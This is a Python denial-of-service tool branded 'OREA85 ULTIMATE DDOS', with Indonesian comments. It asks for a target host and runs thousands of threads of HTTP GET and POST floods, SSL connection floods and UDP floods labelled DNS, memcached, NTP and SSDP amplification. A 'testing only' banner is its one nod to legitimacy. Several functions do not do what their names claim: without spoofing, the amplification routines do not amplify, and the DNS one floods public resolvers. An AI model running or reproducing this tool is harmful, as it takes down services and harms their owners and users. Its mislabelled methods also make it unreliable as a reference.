#!/usr/bin/env python3
import socket
import threading
import random
import time
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

class AdvancedDDOS:
    def __init__(self, target, port=80, threads=2000):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = True
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        
    def http_get_flood(self):
        """HTTP GET Flood dengan headers realistis"""
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0'
                }
                requests.get(f"http://{self.target}:{self.port}/", headers=headers, timeout=5)
            except:
                pass
    
    def http_post_flood(self):
        """HTTP POST Flood dengan data besar"""
        while self.running:
            try:
                data = random._urandom(1024)
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(len(data)),
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                requests.post(f"http://{self.target}:{self.port}/", data=data, headers=headers, timeout=5)
            except:
                pass
    
    def ssl_flood(self):
        """SSL/TLS Flood Attack"""
        while self.running:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
                ssl_sock.connect((self.target, 443))
                ssl_sock.send(random._urandom(1024))
                ssl_sock.close()
            except:
                pass
    
    def dns_amplification(self):
        """DNS Amplification Attack"""
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "1.0.0.1"]
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for dns in dns_servers:
                    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
                    sock.sendto(query, (dns, 53))
            except:
                pass
    
    def memcached_amplification(self):
        """Memcached Amplification Attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                command = b"get\r\n"
                sock.sendto(command, (self.target, 11211))
            except:
                pass
    
    def ntp_amplification(self):
        """NTP Amplification Attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b'\x17\x00\x03\x2a' + b'\x00' * 4
                sock.sendto(data, (self.target, 123))
            except:
                pass
    
    def ssdp_amplification(self):
        """SSDP Amplification Attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                request = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
                sock.sendto(request, (self.target, 1900))
            except:
                pass
    
    def start_attack(self):
        """Memulai semua serangan advanced secara simultan"""
        print(f"🚀 Advanced DDOS Attack dimulai!")
        print(f"🎯 Target: {self.target}:{self.port}")
        print(f"⚡ Threads: {self.threads}")
        print("🔥 Semua metode serangan aktif...")
        print("⚠️  Tekan CTRL+C untuk berhenti")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Membagi thread untuk setiap jenis serangan
            threads_per_attack = self.threads // 7
            
            for _ in range(threads_per_attack):
                executor.submit(self.http_get_flood)
                executor.submit(self.http_post_flood)
                executor.submit(self.ssl_flood)
                executor.submit(self.dns_amplification)
                executor.submit(self.memcached_amplification)
                executor.submit(self.ntp_amplification)
                executor.submit(self.ssdp_amplification)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n✅ Semua serangan dihentikan")

def main():
    print("=" * 60)
    print("🎯 OREA85 ULTIMATE DDOS - ADVANCED VERSION")
    print("=" * 60)
    print("⚠️  WARNING: Script ini sangat berbahaya!")
    print("🔥 Gunakan hanya untuk testing keamanan!")
    print("💎 Created by OREA85")
    print("=" * 60)
    
    try:
        target = input("🎯 Masukkan target IP/domain: ")
        port = int(input("🔌 Masukkan port (default 80): ") or "80")
        threads = int(input("⚡ Masukkan jumlah threads (default 2000): ") or "2000")
        
        if not target:
            print("❌ Target tidak boleh kosong!")
            return
            
        print(f"\n🔍 Memverifikasi target {target}...")
        time.sleep(2)
        
        attack = AdvancedDDOS(target, port, threads)
        attack.start_attack()
        
    except ValueError:
        print("❌ Input tidak valid!")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()